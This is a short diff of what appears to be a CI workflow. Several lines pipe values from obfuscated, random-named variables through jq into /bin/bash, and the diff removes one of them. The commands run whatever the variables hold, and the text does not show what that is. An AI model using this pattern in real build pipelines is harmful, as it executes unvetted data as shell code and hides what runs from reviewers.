@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$vmecg75686" | jq -r .ifub399 | /bin/bash
           printf '%s' "$rfnm14429" | jq -r .rob76512 | /bin/bash
           printf '%s' "$kbjo034" | jq -r .coja2817 | /bin/bash
-          echo $g1316 | jq -r .ehge12919 | /bin/bash
           printf '%s' "$z88875" | jq -r .y7313 | /bin/bash
 
       - name: Save data
